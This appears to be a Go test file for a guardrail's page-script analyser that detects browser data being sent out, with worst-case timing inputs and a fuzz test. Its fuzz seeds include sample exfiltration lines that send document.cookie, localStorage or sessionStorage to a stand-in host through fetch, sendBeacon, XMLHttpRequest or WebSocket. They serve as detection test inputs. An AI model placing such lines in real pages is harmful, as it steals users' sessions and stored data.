// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package toolshape

import (
	"strings"
	"testing"
	"time"

	"github.com/defenseclaw/defenseclaw/internal/guardrail/bounded"
)

// worstScripts are page scripts of the largest size the reader accepts, built
// to make its passes repeat: nested calls whose argument ranges all end at the
// end of the script, and a chain of assignments whose right sides all end there.
func worstScripts() map[string]string {
	read := "const s = document.cookie;\n"
	n := 20000
	out := map[string]string{
		"assign-chain":         read + strings.Repeat("x=", 30000) + "1",
		"nested-fetch":         read + strings.Repeat("fetch(", n) + "1" + strings.Repeat(")", n),
		"nested-fetch-open":    read + strings.Repeat("fetch(", n),
		"nested-fetch-tainted": read + strings.Repeat("fetch(s+", n/2) + "1" + strings.Repeat(")", n/2),
		"nested-defined-call":  read + "function f(a){return a}\n" + strings.Repeat("f(", n) + "1" + strings.Repeat(")", n),
		"nested-goto":          read + "fetch(s);" + strings.Repeat("p.goto(", n) + "1" + strings.Repeat(")", n),
		"src-chain":            read + strings.Repeat("a.src=", 20000) + "1",
		"bound-once":           read + strings.Repeat("x=", 20000) + "1;" + strings.Repeat("fetch(x+s);", 1500),
		"setattr-nested":       read + strings.Repeat("a.setAttribute(", n/2) + "1" + strings.Repeat(")", n/2),
		"then-chain":           read + "q" + strings.Repeat(".then(p=>p)", 8000),
		"for-of":               read + strings.Repeat("for(const c of ", 10000) + "1",
		"ws-new":               read + strings.Repeat("new WebSocket(", 15000) + "1" + strings.Repeat(")", 15000),
		"brackets-unmatched":   read + strings.Repeat("{", 60000),
		"template-nest":        read + strings.Repeat("`${", 20000),
		"unicode-brace":        read + "'" + strings.Repeat("\\u{", 60000) + "'",
	}
	return out
}

// The work budget cuts a script built to make every pass cross the rest of the
// script, and says so (bounded.Time); none of these takes more than a moment.
func TestPageScriptWorstCaseTime(t *testing.T) {
	for name, code := range worstScripts() {
		start := time.Now()
		flow := AnalyzePageScript(code)
		d := time.Since(start)
		t.Logf("%-22s %7d bytes %10s sends=%d trunc=%v", name, len(code), d, len(flow.Sends), flow.Truncated)
		if d > 2*time.Second {
			t.Errorf("%s: %s", name, d)
		}
	}
}

// FuzzAnalyzePageScript: the reader never panics, its lists stay within their
// bounds and a host it reports is a bare lower-case host.
func FuzzAnalyzePageScript(f *testing.F) {
	for _, seed := range []string{
		"",
		"() => fetch('https://c.example.net/x?d=' + document.cookie)",
		"const s = localStorage.getItem('k'); navigator.sendBeacon(`https://${h}/p`, s)",
		"const x = new XMLHttpRequest(); x.open('POST', u); x.send(sessionStorage)",
		"const w = new WebSocket('wss://c.example.net'); w.send(document.cookie)",
		"a.src = 'https://c.example.net/' + document.cookie; b.setAttribute('action', document.cookie)",
		"await page.goto('https://app.example.org/'); const c = await page.context().cookies(); fetch(c)",
		"q.then(p => fetch(p)); for (const c of document.cookie) fetch(c)",
		"'\\u{41' + `${`${",
		"/* open",
		"fetch(" + strings.Repeat("(", 40),
	} {
		f.Add(seed)
	}
	for name, code := range worstScripts() {
		if len(code) > 4096 {
			code = code[:4096]
		}
		f.Add(name + code)
	}
	f.Fuzz(func(t *testing.T, code string) {
		flow := AnalyzePageScript(code)
		if len(flow.Sends) > maxPageSends || len(flow.Gotos) > maxPageSends {
			t.Fatalf("lists over the bound: %d sends, %d gotos", len(flow.Sends), len(flow.Gotos))
		}
		for _, s := range flow.Sends {
			if s.Dest == DestHost && (s.Host == "" || s.Host != strings.ToLower(s.Host) || strings.ContainsAny(s.Host, "/?#@ ")) {
				t.Fatalf("host %q is not a bare host", s.Host)
			}
			if s.Dest != DestHost && s.Host != "" {
				t.Fatalf("send %+v has a host and no host destination", s)
			}
		}
		if len(code) > maxPageScript && !flow.Truncated.Has(bounded.Bytes) {
			t.Fatal("a script over the byte bound is not marked truncated")
		}
	})
}
